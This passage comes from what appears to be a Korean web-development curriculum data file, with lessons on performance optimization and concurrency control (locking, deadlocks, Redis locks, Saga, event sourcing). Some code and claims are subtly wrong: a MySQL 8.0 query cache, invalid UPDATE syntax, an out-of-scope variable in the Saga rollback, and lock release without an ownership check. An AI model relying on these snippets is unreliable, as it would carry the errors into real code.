          summary: "Disk space < 10%"`},{heading:"7. On-Call 로테이션",content:"24/7 모니터링을 위한 당직 체계:",list:["PagerDuty: 당직자 자동 호출 (전화, SMS)","Opsgenie: 에스컬레이션 정책 (1차 → 2차 → 매니저)","VictorOps: 타임존별 로테이션","개인 프로젝트: Slack + 스마트폰 알림으로 충분"]},{heading:"⚡ 고급 실습 과제",checklist:["Prometheus + Grafana 스택 구축 및 Node/MySQL/Redis Exporter 연동","커스텀 메트릭 (요청 수, 응답 시간) 노출 및 Grafana 그래프 생성","SLI 정의 후 Grafana 대시보드에 표시 (가용성, 지연시간, 에러율)","Alertmanager로 알림 규칙 설정 (CPU > 80%, 메모리 > 90%)","7일간 메트릭 수집 후 SLO 달성 여부 분석"]}]}}}]},{id:"tier3",name:"Tier 3: 확장과 최적화",period:"5~8주",color:"bg-green-100 border-green-300 text-green-800",reason:"사용자가 늘어나고 데이터가 쌓이면서 생기는 문제 해결",topics:[{id:"3-1",name:"성능 최적화 기초",goal:"병목 지점을 찾고 개선할 수 있다",hours:8,keywords:["performance optimization","bottleneck analysis","web vitals"],tasks:["Lighthouse로 현재 점수 측정","가장 느린 페이지 3개 찾기","이미지 최적화 1회 실행"],content:{beginner:{title:"초급: 성능 문제가 무엇인지 이해하고 측정 도구 사용하기",sections:[{heading:"📚 학습 목표",content:"웹사이트의 성능을 측정하고, 어디가 느린지 파악할 수 있다."},{heading:"1. 성능이 왜 중요한가?",content:"사용자는 3초 안에 로딩되지 않으면 페이지를 떠납니다.",list:["로딩 시간 1초 증가 → 전환율 7% 감소","모바일에서는 더 심각 (4G 환경)","검색엔진 순위에도 영향 (SEO)","서버 리소스 낭비 → 운영 비용 증가"]},{heading:"2. Core Web Vitals 이해하기",content:"Google이 정의한 3가지 핵심 성능 지표:",code:`# LCP (Largest Contentful Paint)
- 가장 큰 콘텐츠가 화면에 표시되는 시간
- 목표: 2.5초 이내
- 예: 메인 이미지, 큰 텍스트 블록

# FID (First Input Delay)
- 사용자가 클릭했을 때 반응하는 시간
- 목표: 100ms 이내
- 예: 버튼 클릭, 링크 터치

# CLS (Cumulative Layout Shift)
- 페이지 로딩 중 레이아웃이 밀리는 정도
- 목표: 0.1 이하
- 예: 이미지 로딩으로 텍스트가 아래로 밀림`},{heading:"3. Lighthouse로 성능 측정하기",steps:[{label:"Chrome DevTools 사용",code:`# 1. 크롬 브라우저에서 F12 (개발자 도구)
# 2. Lighthouse 탭 클릭
# 3. Categories: Performance 체크
# 4. Device: Mobile 또는 Desktop 선택
# 5. "Analyze page load" 버튼 클릭

# 결과 확인:
- Performance 점수 (0~100)
- FCP (First Contentful Paint): 1.8s
- LCP: 3.5s ← 느림! (2.5s 목표)
- TBT (Total Blocking Time): 150ms
- CLS: 0.05 ← 좋음!`},{label:"온라인 도구 사용",code:`# PageSpeed Insights
https://pagespeed.web.dev/

# 1. URL 입력
# 2. 모바일/데스크톱 결과 모두 확인
# 3. Opportunities (개선 기회) 섹션 주목
# 4. Diagnostics (진단) 섹션에서 문제 확인`}]},{heading:"4. 가장 느린 페이지 찾기",code:`// Backend에서 응답 시간 로깅 (Express.js 예시)
app.use((req, res, next) => {
  const start = Date.now();

  res.on('finish', () => {
    const duration = Date.now() - start;
    if (duration > 1000) { // 1초 이상
      console.log(\`[SLOW] \${req.method} \${req.url} - \${duration}ms\`);
    }
  });

  next();
});

// 실제 로그 예시:
// [SLOW] GET /api/products?page=5 - 2300ms ← 문제!
// [SLOW] POST /api/upload - 1800ms
// [SLOW] GET /dashboard - 1200ms`},{heading:"5. 이미지 최적화 - 가장 쉬운 개선",steps:[{label:"문제 확인",code:`# Lighthouse에서:
"Properly size images" - 200KB 절약 가능
"Serve images in modern formats" - WebP 사용 권장
"Efficiently encode images" - 품질 최적화 필요`},{label:"온라인 도구로 최적화",code:`# TinyPNG (https://tinypng.com/)
- PNG, JPEG 업로드
- 자동으로 60~70% 압축
- 품질 손실 거의 없음

# 예시:
product.jpg (500KB) → product-optimized.jpg (150KB)
- 70% 용량 감소
- 눈으로 차이 거의 없음`},{label:"WebP 변환 (최신 포맷)",code:`# Squoosh (https://squoosh.app/)
1. 이미지 업로드
2. 오른쪽에서 WebP 선택
3. Quality: 75~85 설정
4. 다운로드

# HTML에서 사용 (구형 브라우저 대비)
<picture>
  <source srcset="hero.webp" type="image/webp">
  <img src="hero.jpg" alt="Hero">
</picture>`}]},{heading:"6. 빠른 성과를 위한 체크리스트",checklist:["모든 이미지 WebP로 변환 (또는 압축)","이미지에 width/height 속성 추가 (CLS 방지)",'폰트 preload 설정: <link rel="preload" href="font.woff2" as="font">',"불필요한 JavaScript 라이브러리 제거","CSS 파일 압축 (Minify)"]},{heading:"💡 초급 실습 과제",checklist:["현재 사이트 Lighthouse 점수 측정 후 스크린샷 저장","가장 큰 이미지 3개 찾아서 WebP로 변환","변환 후 다시 측정하여 점수 개선 확인","LCP 시간이 몇 초 단축되었는지 기록"]}]},intermediate:{title:"중급: 병목 지점 분석하고 캐싱 전략 수립하기",sections:[{heading:"📚 학습 목표",content:"Chrome DevTools를 사용해 정확한 병목 지점을 찾고, 효과적인 캐싱 전략을 적용할 수 있다."},{heading:"1. Performance 탭으로 병목 분석",steps:[{label:"녹화 시작",code:`# Chrome DevTools → Performance 탭
1. 빨간 점(Record) 클릭
2. 페이지 새로고침 (Ctrl+R)
3. 로딩 완료 후 Stop 버튼

# 결과 읽기:
- FCP (파란 선): 1.2s
- LCP (초록 선): 3.8s ← 여기가 문제!
- Main 섹션: JavaScript 실행 시간
- Network 섹션: 리소스 로딩 시간`},{label:"병목 구간 확인",code:`# Main Thread 분석:
- Evaluate Script: 800ms ← 큰 번들 파일
- Parse HTML: 200ms
- Layout: 150ms
- Paint: 100ms

# 결론: JavaScript 번들 최적화 필요
- 큰 라이브러리 lazy load
- Code splitting 적용
- Tree shaking으로 미사용 코드 제거`}]},{heading:"2. Network 탭으로 느린 요청 찾기",code:`# Chrome DevTools → Network 탭
1. Disable cache 체크
2. 페이지 새로고침
3. Waterfall 차트 분석

# 문제 패턴:
┌─────────────────────────────────┐
│ app.js       │███████████████   │ 2.5s ← 너무 큼
│ api/products │      ████         │ 800ms ← DB 쿼리 느림
│ hero.jpg     │  ████             │ 600ms ← 이미지 큼
│ style.css    │██                 │ 200ms
└─────────────────────────────────┘

# 해결 방안:
1. app.js → Code splitting으로 나누기
2. api/products → 인덱스 추가 또는 Redis 캐싱
3. hero.jpg → WebP + CDN 사용`},{heading:"3. 브라우저 캐싱 전략",code:`// Express.js에서 Cache-Control 헤더 설정
app.use(express.static('public', {
  maxAge: '1y', // 1년 캐싱
  immutable: true
}));

// 정적 파일별로 다르게 설정
app.get('/api/*', (req, res) => {
  res.set('Cache-Control', 'no-cache'); // API는 캐시 안 함
});

app.get('/static/*', (req, res) => {
  res.set('Cache-Control', 'public, max-age=31536000'); // 이미지/CSS/JS는 1년
});

// Nginx 설정 예시
location ~* \\.(jpg|jpeg|png|gif|ico|css|js)$ {
  expires 1y;
  add_header Cache-Control "public, immutable";
}`},{heading:"4. CDN 활용하기",content:"정적 파일을 CDN에 올리면 전 세계 어디서나 빠르게 로딩됩니다.",steps:[{label:"Cloudflare CDN (무료) 설정",code:`# 1. Cloudflare 계정 생성
# 2. 도메인 추가
# 3. 네임서버 변경
# 4. Speed → Optimization 설정:
   - Auto Minify: HTML, CSS, JS 체크
   - Brotli 압축 활성화
   - 이미지 최적화 (Polish) 활성화

# 효과:
- 서버 부하 70% 감소
- 로딩 속도 50% 향상 (해외 사용자)
- HTTPS 자동 적용`}]},{heading:"5. Lazy Loading 구현",code:`// 이미지 Lazy Load (네이티브 방식)
<img src="product.jpg" loading="lazy" alt="Product">

// JavaScript 번들 Lazy Load (React 예시)
import { lazy, Suspense } from 'react';

const HeavyComponent = lazy(() => import('./HeavyComponent'));

function App() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <HeavyComponent />
    </Suspense>
  );
}

// 효과:
- 초기 번들 크기: 500KB → 200KB (60% 감소)
- FCP: 2.5s → 1.2s (52% 개선)`},{heading:"6. Database 쿼리 최적화",code:`// 문제: N+1 쿼리
products.forEach(async (product) => {
  const category = await db.query(
    'SELECT * FROM categories WHERE id = ?',
    [product.category_id]
  );
  // 100개 상품 → 100번 쿼리
});

// 해결: JOIN으로 한 번에
const products = await db.query(\`
  SELECT p.*, c.name as category_name
  FROM products p
  LEFT JOIN categories c ON p.category_id = c.id
\`);
// 1번 쿼리로 해결

// Redis 캐싱 추가
const cacheKey = 'products:all';
let products = await redis.get(cacheKey);

if (!products) {
  products = await db.query('SELECT * FROM products');
  await redis.setex(cacheKey, 300, JSON.stringify(products)); // 5분 캐시
}`},{heading:"⚡ 중급 실습 과제",checklist:["Performance 탭으로 메인 스레드 병목 구간 찾아서 스크린샷","가장 느린 API 엔드포인트 3개 찾고 응답 시간 기록","정적 파일에 1년 캐시 헤더 설정 후 Network 탭에서 확인","이미지 lazy loading 적용 후 LCP 개선 확인","Cloudflare CDN 연결 후 전/후 속도 비교 (GTmetrix 사용)"]}]},advanced:{title:"고급: 실시간 모니터링과 자동화된 성능 관리",sections:[{heading:"📚 학습 목표",content:"성능을 실시간으로 모니터링하고, 자동으로 개선하는 시스템을 구축할 수 있다."},{heading:"1. Real User Monitoring (RUM) 구축",content:"실제 사용자의 경험을 측정하는 시스템:",code:`// Frontend에서 Core Web Vitals 측정
import { getCLS, getFID, getLCP } from 'web-vitals';

function sendToAnalytics({ name, delta, id }) {
  fetch('/api/analytics', {
    method: 'POST',
    body: JSON.stringify({
      metric: name,
      value: delta,
      id: id,
      url: window.location.href,
      userAgent: navigator.userAgent
    }),
    headers: { 'Content-Type': 'application/json' }
  });
}

getCLS(sendToAnalytics);
getFID(sendToAnalytics);
getLCP(sendToAnalytics);

// Backend에서 저장 (MongoDB 예시)
app.post('/api/analytics', async (req, res) => {
  await db.collection('metrics').insertOne({
    ...req.body,
    timestamp: new Date()
  });
  res.sendStatus(200);
});`},{heading:"2. Lighthouse CI 자동화",content:"Pull Request마다 자동으로 성능 점검:",code:`# .github/workflows/lighthouse.yml
name: Lighthouse CI
on: [pull_request]

jobs:
  lighthouse:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm ci
      - run: npm run build

      - name: Run Lighthouse CI
        run: |
          npm install -g @lhci/cli
          lhci autorun
        env:
          LHCI_GITHUB_APP_TOKEN: \${{ secrets.LHCI_GITHUB_APP_TOKEN }}

# lighthouserc.json
{
  "ci": {
    "collect": {
      "url": ["http://localhost:3000"],
      "startServerCommand": "npm start"
    },
    "assert": {
      "assertions": {
        "categories:performance": ["error", {"minScore": 0.9}],
        "first-contentful-paint": ["error", {"maxNumericValue": 2000}],
        "interactive": ["error", {"maxNumericValue": 3500}]
      }
    }
  }
}

# 효과: 성능 점수 90 미만이면 PR merge 차단`},{heading:"3. 성능 예산 (Performance Budget) 설정",code:`// webpack-bundle-analyzer로 번들 크기 모니터링
// package.json
{
  "scripts": {
    "analyze": "webpack-bundle-analyzer dist/stats.json"
  }
}

// 번들 크기 제한 설정
// webpack.config.js
module.exports = {
  performance: {
    maxAssetSize: 244000, // 244KB
    maxEntrypointSize: 244000,
    hints: 'error' // 초과 시 빌드 실패
  }
};

// 이미지 크기 자동 최적화
// vite.config.js
import imagemin from 'vite-plugin-imagemin';

export default {
  plugins: [
    imagemin({
      gifsicle: { optimizationLevel: 7 },
      optipng: { optimizationLevel: 7 },
      mozjpeg: { quality: 80 },
      webp: { quality: 80 }
    })
  ]
};`},{heading:"4. 서버 사이드 렌더링 (SSR) 최적화",code:`// Next.js에서 증분 정적 재생성 (ISR)
export async function getStaticProps() {
  const products = await fetchProducts();

  return {
    props: { products },
    revalidate: 60 // 60초마다 재생성
  };
}

// 효과:
// 1. 초기 로딩: HTML이 즉시 표시 (LCP 0.8s)
// 2. 캐시: 60초 동안 정적 파일 제공
// 3. 업데이트: 백그라운드에서 자동 재생성

// Edge Functions로 지역별 최적화
export const config = {
  runtime: 'edge'
};

export default async function handler(req) {
  const country = req.geo.country;
  const products = await getProductsByCountry(country);

  return new Response(JSON.stringify(products), {
    headers: {
      'Cache-Control': 's-maxage=3600, stale-while-revalidate'
    }
  });
}`},{heading:"5. Database 연결 풀링과 쿼리 캐싱",code:`// MySQL 연결 풀 최적화
const pool = mysql.createPool({
  host: 'localhost',
  user: 'root',
  password: 'password',
  database: 'cms',
  connectionLimit: 20, // 최대 20개 연결
  queueLimit: 0,
  waitForConnections: true,
  enableKeepAlive: true,
  keepAliveInitialDelay: 0
});

// Query Result Caching (MySQL 8.0+)
SET GLOBAL query_cache_type = ON;
SET GLOBAL query_cache_size = 67108864; // 64MB

// 또는 Application Level Caching
const NodeCache = require('node-cache');
const cache = new NodeCache({ stdTTL: 600 }); // 10분

app.get('/api/products', async (req, res) => {
  const cacheKey = \`products_\${req.query.page}\`;

  let data = cache.get(cacheKey);
  if (data) {
    return res.json({ data, cached: true });
  }

  data = await pool.query('SELECT * FROM products LIMIT ?, 20', [offset]);
  cache.set(cacheKey, data);

  res.json({ data, cached: false });
});`},{heading:"6. APM (Application Performance Monitoring) 도구",steps:[{label:"New Relic 설정 (무료 플랜)",code:`# 1. New Relic 계정 생성
# 2. Node.js 에이전트 설치
npm install newrelic

# 3. newrelic.js 설정
exports.config = {
  app_name: ['My CMS'],
  license_key: 'YOUR_LICENSE_KEY',
  logging: {
    level: 'info'
  }
};

# 4. 앱 시작 시 로드
// index.js 최상단
require('newrelic');
const express = require('express');

# 모니터링 가능:
- 응답 시간 분포 (p50, p95, p99)
- 느린 트랜잭션 자동 탐지
- DB 쿼리 성능 추적
- 에러율 및 스택 트레이스`},{label:"Sentry로 성능 모니터링",code:`import * as Sentry from '@sentry/node';

Sentry.init({
  dsn: 'YOUR_DSN',
  tracesSampleRate: 0.1, // 10% 트랜잭션 추적
  integrations: [
    new Sentry.Integrations.Http({ tracing: true }),
    new Sentry.Integrations.Express({ app })
  ]
});

// 느린 API 자동 감지
app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.tracingHandler());

// 커스텀 성능 측정
const transaction = Sentry.startTransaction({
  op: 'db.query',
  name: 'Fetch Products'
});

const products = await db.query('SELECT * FROM products');

transaction.finish();`}]},{heading:"⚡ 고급 실습 과제",checklist:["web-vitals 라이브러리로 RUM 구축 후 7일간 데이터 수집","Lighthouse CI를 GitHub Actions에 통합하여 자동 점검","번들 크기 200KB 이하로 제한하고 초과 시 빌드 실패 설정","Next.js ISR 또는 SSR 적용 후 LCP 2초 이내 달성","New Relic 또는 Sentry 연동 후 p95 응답 시간 500ms 이하 유지"]}]}}},{id:"3-2",name:"동시성 제어와 Race Condition",goal:"여러 사용자가 동시에 데이터를 수정할 때 생기는 문제를 해결할 수 있다",hours:10,keywords:["race condition","concurrency control","database locking"],tasks:["2개 브라우저로 동시 수정 테스트","충돌 상황 재현","간단한 잠금 메커니즘 구현"],content:{beginner:{title:"초급: Race Condition이 무엇인지 이해하고 문제 재현하기",sections:[{heading:"📚 학습 목표",content:"동시성 문제가 무엇인지 이해하고, 실제로 문제를 재현해볼 수 있다."},{heading:"1. Race Condition이란?",content:"여러 사용자가 동시에 같은 데이터를 수정할 때 발생하는 문제입니다.",code:`# 시나리오: 재고 10개인 상품을 두 명이 동시 구매
시간  |  사용자A          |  사용자B          |  실제 재고
-----|------------------|------------------|----------
1초   | 재고 확인 (10개) |                  | 10
2초   | 1개 구매 결정    | 재고 확인 (10개) | 10
3초   | 재고 = 10-1 = 9  | 1개 구매 결정    | 10
4초   | 저장 (9개)       | 재고 = 10-1 = 9  | 9
5초   |                  | 저장 (9개)       | 9 ← 버그!

# 문제: 2개 팔렸는데 재고는 1개만 줄어듦
# 원인: 두 사용자가 같은 초기값(10)을 읽었기 때문`},{heading:"2. 실제 발생하는 문제 사례",list:["이커머스: 재고 10개인데 15명이 구매 성공 → 마이너스 재고","은행 앱: 잔액 1만원인데 동시 출금으로 2만원 인출","좋아요 기능: 100개였는데 동시 클릭으로 101이 아닌 99로 변경","게시글 조회수: 정확하지 않은 카운팅"]},{heading:"3. 문제 재현하기 (브라우저 2개)",steps:[{label:"테스트 페이지 준비",code:`<!-- test-race.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>재고 관리 테스트</h1>
  <p>현재 재고: <span id="stock">10</span>개</p>
  <button onclick="buyProduct()">구매하기 (1개)</button>

  <script>
    async function buyProduct() {
      // 1. 현재 재고 읽기
      const response = await fetch('/api/stock');
      const { stock } = await response.json();

      console.log('현재 재고:', stock);

      // 2. 1초 대기 (동시 실행 시뮬레이션)
      await new Promise(r => setTimeout(r, 1000));

      // 3. 재고 감소시켜서 저장
      await fetch('/api/stock', {
        method: 'PUT',
        body: JSON.stringify({ stock: stock - 1 }),
        headers: { 'Content-Type': 'application/json' }
      });

      // 4. 화면 업데이트
      document.getElementById('stock').textContent = stock - 1;
    }
  <\/script>
</body>
</html>`},{label:"백엔드 API (Express.js)",code:`let stock = 10; // 초기 재고

app.get('/api/stock', (req, res) => {
  res.json({ stock });
});

app.put('/api/stock', (req, res) => {
  stock = req.body.stock;
  console.log('재고 업데이트:', stock);
  res.json({ stock });
});`},{label:"재현 방법",code:`1. 브라우저 2개 열기 (Chrome, Edge 또는 시크릿 모드)
2. 양쪽 모두 http://localhost:3000/test-race.html 접속
3. 동시에 "구매하기" 버튼 클릭 (0.5초 차이 내)

# 예상 결과: 재고 8개 (10 - 1 - 1)
# 실제 결과: 재고 9개 (버그!)

# 로그:
[브라우저A] 현재 재고: 10
[브라우저B] 현재 재고: 10
[서버] 재고 업데이트: 9
[서버] 재고 업데이트: 9 ← 문제 발생!`}]},{heading:"4. 간단한 해결책: Optimistic Locking (낙관적 잠금)",code:`// 버전 번호를 추가
let stock = 10;
let version = 1;

app.put('/api/stock', (req, res) => {
  const { newStock, clientVersion } = req.body;

  // 버전이 다르면 실패
  if (clientVersion !== version) {
    return res.status(409).json({
      error: '다른 사용자가 먼저 수정했습니다. 새로고침 후 다시 시도하세요.'
    });
  }

  // 버전이 같으면 업데이트
  stock = newStock;
  version++; // 버전 증가
  res.json({ stock, version });
});

// Frontend 수정
async function buyProduct() {
  const { stock, version } = await fetch('/api/stock').then(r => r.json());

  await new Promise(r => setTimeout(r, 1000));

  const response = await fetch('/api/stock', {
    method: 'PUT',
    body: JSON.stringify({
      newStock: stock - 1,
      clientVersion: version // 버전 포함
    }),
    headers: { 'Content-Type': 'application/json' }
  });

  if (response.status === 409) {
    alert('다른 사용자가 먼저 구매했습니다. 다시 시도해주세요.');
    location.reload();
  }
}`},{heading:"5. MySQL에서 Optimistic Locking",code:`-- 테이블에 version 컬럼 추가
ALTER TABLE products ADD COLUMN version INT DEFAULT 1;

-- 업데이트 쿼리 (버전 체크)
UPDATE products
SET stock = stock - 1,
    version = version + 1
WHERE id = 123
  AND version = ?; -- 클라이언트가 읽은 버전

-- 결과:
-- affected rows = 1: 성공
-- affected rows = 0: 실패 (다른 사용자가 먼저 수정함)`},{heading:"💡 초급 실습 과제",checklist:["위 HTML 파일로 Race Condition 재현 후 스크린샷","브라우저 개발자 도구 Console에서 로그 확인","Optimistic Locking 적용 후 다시 테스트","충돌 시 에러 메시지 표시되는지 확인"]}]},intermediate:{title:"중급: 데이터베이스 잠금과 트랜잭션으로 해결하기",sections:[{heading:"📚 학습 목표",content:"데이터베이스 잠금 메커니즘과 트랜잭션 격리 수준을 이해하고 적용할 수 있다."},{heading:"1. Pessimistic Locking (비관적 잠금)",content:"데이터를 읽을 때 미리 잠금을 걸어서 다른 사용자의 접근을 차단합니다.",code:`// MySQL에서 FOR UPDATE 사용
START TRANSACTION;

SELECT stock FROM products
WHERE id = 123
FOR UPDATE; -- 이 행을 잠금 (다른 트랜잭션은 대기)

-- stock이 10이라고 가정
UPDATE products
SET stock = 10 - 1
WHERE id = 123;

COMMIT; -- 잠금 해제

// Node.js 구현
app.post('/api/purchase', async (req, res) => {
  const connection = await pool.getConnection();

  try {
    await connection.beginTransaction();

    // 1. 잠금을 걸고 재고 조회
    const [rows] = await connection.query(
      'SELECT stock FROM products WHERE id = ? FOR UPDATE',
      [req.body.productId]
    );

    const currentStock = rows[0].stock;

    if (currentStock < 1) {
      throw new Error('재고 부족');
    }

    // 2. 재고 감소
    await connection.query(
      'UPDATE products SET stock = stock - 1 WHERE id = ?',
      [req.body.productId]
    );

    await connection.commit();
    res.json({ success: true, remainingStock: currentStock - 1 });

  } catch (error) {
    await connection.rollback();
    res.status(400).json({ error: error.message });
  } finally {
    connection.release();
  }
});`},{heading:"2. 트랜잭션 격리 수준 (Isolation Level)",code:`# MySQL 격리 수준 4단계

# 1. READ UNCOMMITTED (커밋 안 된 데이터도 읽음)
- 문제: Dirty Read (롤백될 데이터 읽음)
- 사용: 거의 안 함

# 2. READ COMMITTED (커밋된 데이터만 읽음)
- 문제: Non-repeatable Read (같은 쿼리가 다른 결과)
- 사용: PostgreSQL 기본값

# 3. REPEATABLE READ (같은 트랜잭션 내 일관된 읽기)
- 문제: Phantom Read (새로운 행 추가 감지 못함)
- 사용: MySQL 기본값 ← 대부분 이걸 사용

# 4. SERIALIZABLE (완전 격리)
- 문제: 성능 저하 (순차 실행)
- 사용: 금융권 중요 거래

-- 설정 방법
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;

-- 현재 설정 확인
SELECT @@transaction_isolation;`},{heading:"3. Deadlock (교착 상태) 이해하고 해결하기",code:`# Deadlock 발생 시나리오

시간 | 트랜잭션 A                    | 트랜잭션 B
-----|------------------------------|-----------------------------
1초  | SELECT * FROM orders WHERE id=1 FOR UPDATE |
2초  |                              | SELECT * FROM orders WHERE id=2 FOR UPDATE
3초  | SELECT * FROM orders WHERE id=2 FOR UPDATE (대기) |
4초  |                              | SELECT * FROM orders WHERE id=1 FOR UPDATE (대기)
5초  | [Deadlock 발생!]             | [Deadlock 발생!]

-- MySQL은 자동으로 하나를 롤백:
ERROR 1213: Deadlock found when trying to get lock

# 해결 방법 1: 항상 같은 순서로 잠금
// Bad (교착 상태 가능)
UPDATE orders WHERE id = 2;
UPDATE orders WHERE id = 1;

// Good (ID 순서대로)
UPDATE orders WHERE id IN (1, 2) ORDER BY id;

# 해결 방법 2: 잠금 타임아웃 설정
SET SESSION innodb_lock_wait_timeout = 5; -- 5초 대기 후 실패

# 해결 방법 3: 재시도 로직
async function updateWithRetry(query, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await db.query(query);
    } catch (error) {
      if (error.code === 'ER_LOCK_DEADLOCK' && i < maxRetries - 1) {
        await new Promise(r => setTimeout(r, 100 * (i + 1))); // 지수 백오프
        continue;
      }
      throw error;
    }
  }
}`},{heading:"4. Redis를 이용한 분산 잠금",content:"여러 서버가 있을 때는 Redis로 잠금을 관리합니다.",code:`const Redis = require('ioredis');
const redis = new Redis();

// Redlock 알고리즘 구현
async function acquireLock(key, ttl = 5000) {
  const lockKey = \`lock:\${key}\`;
  const lockValue = Date.now() + ttl;

  // SET NX: 키가 없을 때만 설정
  const result = await redis.set(
    lockKey,
    lockValue,
    'PX', ttl, // milliseconds
    'NX'       // Not eXists
  );

  return result === 'OK';
}

async function releaseLock(key) {
  await redis.del(\`lock:\${key}\`);
}

// 사용 예시
app.post('/api/purchase', async (req, res) => {
  const productId = req.body.productId;
  const lockKey = \`product:\${productId}\`;

  // 1. 잠금 시도
  const locked = await acquireLock(lockKey, 3000);

  if (!locked) {
    return res.status(409).json({
      error: '다른 사용자가 처리 중입니다. 잠시 후 다시 시도해주세요.'
    });
  }

  try {
    // 2. 재고 확인 및 차감
    const stock = await db.query(
      'SELECT stock FROM products WHERE id = ?',
      [productId]
    );

    if (stock[0].stock < 1) {
      throw new Error('재고 부족');
    }

    await db.query(
      'UPDATE products SET stock = stock - 1 WHERE id = ?',
      [productId]
    );

    res.json({ success: true });

  } finally {
    // 3. 잠금 해제
    await releaseLock(lockKey);
  }
});`},{heading:"5. 실전: 선착순 이벤트 구현",code:`// 문제: 100명 한정 쿠폰을 1000명이 동시 요청
// 해결: Redis INCR (원자적 연산)

app.post('/api/coupon/claim', async (req, res) => {
  const eventId = req.body.eventId;
  const userId = req.user.id;
  const key = \`event:\${eventId}:count\`;

  // 1. 원자적으로 카운트 증가
  const count = await redis.incr(key);

  // 2. 100명 초과 시 실패
  if (count > 100) {
    return res.status(410).json({
      error: '마감되었습니다.'
    });
  }

  // 3. 쿠폰 발급
  await db.query(
    'INSERT INTO coupons (event_id, user_id) VALUES (?, ?)',
    [eventId, userId]
  );

  res.json({
    success: true,
    yourNumber: count // 몇 번째 당첨자인지
  });
});

// TTL 설정 (24시간 후 자동 삭제)
await redis.expire(\`event:\${eventId}:count\`, 86400);`},{heading:"⚡ 중급 실습 과제",checklist:["FOR UPDATE로 Pessimistic Locking 구현 후 동시 요청 테스트","Deadlock 의도적으로 발생시키고 에러 로그 확인","Redis 분산 잠금으로 선착순 이벤트 구현 (100명 한정)","Apache Bench로 동시 요청 1000개 보내서 정확히 100명만 성공하는지 확인","트랜잭션 격리 수준 변경 후 동작 차이 테스트"]}]},advanced:{title:"고급: 분산 시스템에서의 동시성 제어와 이벤트 소싱",sections:[{heading:"📚 학습 목표",content:"분산 환경에서 동시성을 제어하고, 이벤트 소싱 패턴을 이해할 수 있다."},{heading:"1. 분산 트랜잭션 (2PC - Two Phase Commit)",content:"여러 데이터베이스에 걸친 트랜잭션을 안전하게 처리하는 방법:",code:`// 문제: 주문 DB와 재고 DB가 분리된 경우
// 주문은 성공했는데 재고 차감 실패 → 데이터 불일치

// 2단계 커밋 프로토콜
class DistributedTransaction {
  async execute() {
    const participants = [orderDB, inventoryDB, paymentDB];

    // Phase 1: Prepare (준비 단계)
    try {
      for (const db of participants) {
        await db.prepare(); // 트랜잭션 시작, 잠금 획득
      }
    } catch (error) {
      // 하나라도 실패하면 모두 롤백
      for (const db of participants) {
        await db.rollback();
      }
      throw error;
    }

    // Phase 2: Commit (커밋 단계)
    try {
      for (const db of participants) {
        await db.commit();
      }
    } catch (error) {
      // 치명적 오류: 수동 복구 필요
      console.error('Commit failed:', error);
      // 보상 트랜잭션 실행
    }
  }
}

// 실제 구현 (Saga 패턴)
async function createOrder(orderData) {
  const sagaId = uuid();

  try {
    // 1. 주문 생성
    const order = await orderDB.create(orderData);

    // 2. 재고 차감
    await inventoryDB.decreaseStock(order.productId, order.quantity);

    // 3. 결제 처리
    await paymentDB.charge(order.userId, order.amount);

    return order;

  } catch (error) {
    // 보상 트랜잭션 (Compensating Transaction)
    await orderDB.cancel(order.id);
    await inventoryDB.increaseStock(order.productId, order.quantity);
    // 결제는 아직 안 했으므로 보상 불필요

    throw error;
  }
}`},{heading:"2. Redlock (Redis 분산 잠금 알고리즘)",content:"여러 Redis 인스턴스에서 안전하게 잠금을 관리:",code:`const Redlock = require('redlock');
const Redis = require('ioredis');

// 최소 3개의 Redis 인스턴스 (홀수 권장)
const redisA = new Redis({ host: 'redis1.example.com' });
const redisB = new Redis({ host: 'redis2.example.com' });
const redisC = new Redis({ host: 'redis3.example.com' });

const redlock = new Redlock(
  [redisA, redisB, redisC],
  {
    driftFactor: 0.01,
    retryCount: 10,
    retryDelay: 200,
    retryJitter: 200
  }
);

// 잠금 획득
app.post('/api/limited-offer', async (req, res) => {
  const resource = 'limited-offer:item123';
  const ttl = 5000; // 5초

  let lock;
  try {
    // 과반수(2/3) Redis에서 잠금 획득 성공해야 함
    lock = await redlock.acquire([resource], ttl);

    // 비즈니스 로직 실행
    const stock = await db.query('SELECT stock FROM products WHERE id = 123');

    if (stock[0].stock > 0) {
      await db.query('UPDATE products SET stock = stock - 1 WHERE id = 123');
      res.json({ success: true });
    } else {
      res.status(410).json({ error: '품절' });
    }

  } catch (error) {
    res.status(409).json({ error: '잠시 후 다시 시도해주세요' });

  } finally {
    if (lock) {
      await lock.release();
    }
  }
});`},{heading:"3. 이벤트 소싱 (Event Sourcing) 패턴",content:"상태를 직접 저장하지 않고 이벤트 시퀀스로 저장하여 동시성 문제 해결:",code:`// 기존 방식 (상태 저장)
UPDATE accounts SET balance = balance - 100 WHERE id = 123;
// 문제: 동시 출금 시 Race Condition 발생

// 이벤트 소싱 (이벤트 저장)
// events 테이블
// id | aggregate_id | event_type | amount | timestamp | version
// 1  | acc-123      | Deposited  | 1000   | ...       | 1
// 2  | acc-123      | Withdrawn  | 100    | ...       | 2
// 3  | acc-123      | Withdrawn  | 50     | ...       | 3

class BankAccount {
  constructor(accountId) {
    this.accountId = accountId;
    this.balance = 0;
    this.version = 0;
  }

  // 이벤트 적용
  apply(event) {
    switch (event.type) {
      case 'Deposited':
        this.balance += event.amount;
        break;
      case 'Withdrawn':
        this.balance -= event.amount;
        break;
    }
    this.version = event.version;
  }

  // 상태 복원
  static async load(accountId) {
    const account = new BankAccount(accountId);

    const events = await db.query(
      'SELECT * FROM events WHERE aggregate_id = ? ORDER BY version',
      [accountId]
    );

    events.forEach(event => account.apply(event));
    return account;
  }

  // 출금 커맨드
  async withdraw(amount) {
    if (this.balance < amount) {
      throw new Error('잔액 부족');
    }

    const event = {
      aggregate_id: this.accountId,
      type: 'Withdrawn',
      amount: amount,
      version: this.version + 1
    };

    // Optimistic Concurrency Control
    const result = await db.query(\`
      INSERT INTO events (aggregate_id, event_type, amount, version)
      SELECT ?, ?, ?, ?
      WHERE NOT EXISTS (
        SELECT 1 FROM events
        WHERE aggregate_id = ? AND version >= ?
      )
    \`, [
      this.accountId, event.type, event.amount, event.version,
      this.accountId, event.version
    ]);

    if (result.affectedRows === 0) {
